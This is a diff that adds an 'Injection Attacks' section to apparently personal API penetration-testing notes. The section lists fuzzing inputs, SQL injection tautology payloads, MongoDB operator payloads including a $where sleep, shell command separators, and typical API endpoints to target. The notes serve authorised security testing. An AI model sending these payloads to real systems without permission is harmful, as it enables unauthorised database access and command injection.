@@ -101,6 +101,116 @@ Testing Account Registration for Mass Assignment
 - https://requestbin.com/
 - https://canarytokens.org/
 
+##  Injection Attacks
+
+if the API is expecting a certain type of input (number, string, boolean value) send:
+- A very large number
+- A very large string
+- A negative number
+- A string (instead of a number or boolean value)
+- Random characters
+- Boolean values
+- Meta characters
+
+#### SQL Injection Metacharacters
+
+- SQL metacharacters that can cause some issues:
+```SQL
+'
+
+''
+
+;%00
+
+--
+
+-- -
+
+""
+
+;
+
+' OR '1
+
+' OR 1 -- -
+
+" OR "" = "
+
+" OR 1 = 1 -- -
+
+' OR '' = '
+
+OR 1=1
+```
+
+#### NoSQL Injection
+
+The following are common NoSQL metacharacters you could send in an API request to manipulate the database:
+```json
+$gt 
+
+{"$gt":""}
+
+{"$gt":-1}
+
+$ne
+
+{"$ne":""}
+
+{"$ne":-1}
+
+ $nin
+
+{"$nin":1}
+
+{"$nin":[1]}
+
+{"$where":  "sleep(1000)"}
+```
+
+$gt is a MongoDB NoSQL query operator that selects documents that are greater than the provided value. 
+
+The $ne query operator selects documents where the value is not equal to the provided value. 
+
+The $nin operator is the “not in” operator, used to select documents where the field value is not within the specified array. 
+
+#### OS Injection
+
+Characters such as the following all act as command separators, which enable a program to pair multiple commands together on a single line.
+
+```Shell
+|
+
+||
+
+&
+
+&&
+
+'
+
+"
+
+;
+
+'"
+```
+
+#### Injection Targets
+
+requests that include user input.examples:
+- PUT videos by id
+- GET videos by id
+- POST change-email
+- POST verify-email-token
+- POST login
+- GET location
+- POST check-otp
+- POST posts
+- POST validate-coupon
+- POST orders
+
+
 
 
 
